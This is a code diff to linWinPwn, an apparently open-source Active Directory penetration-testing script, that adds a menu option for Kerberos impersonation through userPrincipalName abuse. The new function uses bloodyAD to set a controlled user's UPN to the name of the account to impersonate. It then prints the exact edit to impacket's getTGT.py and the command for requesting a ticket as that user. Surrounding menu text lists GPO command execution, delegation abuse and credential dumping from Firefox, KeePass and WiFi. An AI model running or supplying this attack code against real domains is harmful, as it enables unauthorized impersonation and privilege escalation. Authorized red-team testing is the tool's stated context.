@@ -133,7 +133,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.13 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.14 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -2739,6 +2739,43 @@ add_spn () {
     echo -e ""
 }
 
+add_upn () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/Modification/bloodyAD
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"          
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
+            echo -e "${BLUE}[*] Adding userPrincipalName to owned user account. Please specify target:${NC}"
+            target_upn=""
+            read -p ">> " target_upn </dev/tty
+            while [ "${target_upn}" == "" ] ; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -p ">> " target_upn </dev/tty
+            done
+            value_upn=""
+            echo -e "${BLUE}[*] Adding userPrincipalName to ${target_upn}. Please specify user to impersonate:${NC}"
+            read -p ">> " value_upn </dev/tty
+            while [ "${value_upn}" == "" ] ; do
+                echo -e "${RED}Invalid name.${NC} Please specify value of upn:"
+                read -p ">> " value_upn </dev/tty
+            done
+            echo -e "${CYAN}[*] Adding UPN ${value_upn} to ${target_upn}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set object '${target_upn}' userPrincipalName -v '${value_upn}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_upn_${dc_domain}.txt 
+            if [[ $(grep -a "has been updated" ${output_dir}/Modification/bloodyAD/bloodyad_out_upn_${dc_domain}.txt 2>/dev/null) ]]; then
+                echo -e "${GREEN}[+] Adding UPN successful! First modify getTGT.py as shown below${NC}"
+                echo -e "${YELLOW}old line #58${NC}: userName = Principal(self.__user, type=constants.PrincipalNameType.${YELLOW}NT_PRINCIPAL${NC}.value)"
+                echo -e "${YELLOW}new line #58${NC}: userName = Principal(self.__user, type=constants.PrincipalNameType.${YELLOW}NT_ENTERPRISE${NC}.value)"
+                echo -e "${GREEN}[+] Generate Kerberos ticket of impersonated user:${NC}"
+                echo -e "${impacket_getTGT} ${domain}/${value_upn}:< password of ${target_upn} > -dc-ip ${dc_ip}"
+            fi 
+       fi
+    fi
+    echo -e ""
+}
+
 ###### pwd_dump: Password Dump
 juicycreds_dump () {
     echo -e "${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
@@ -4444,6 +4481,7 @@ modif_menu () {
     echo -e "10) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
     echo -e "11) Add Unconstrained Delegation rights (Requires: SeEnableDelegationPrivilege rights)"
     echo -e "12) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights (Requires: Owner of computer)"
+    echo -e "13) Add userPrincipalName to perform Kerberos impersonation (Requires: GenericWrite or GenericAll on user)"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -4497,6 +4535,10 @@ modif_menu () {
         12)
         add_spn
         modif_menu;;
+
+        13)
+        add_upn
+        main_menu;;
 
         back)
         main_menu;;
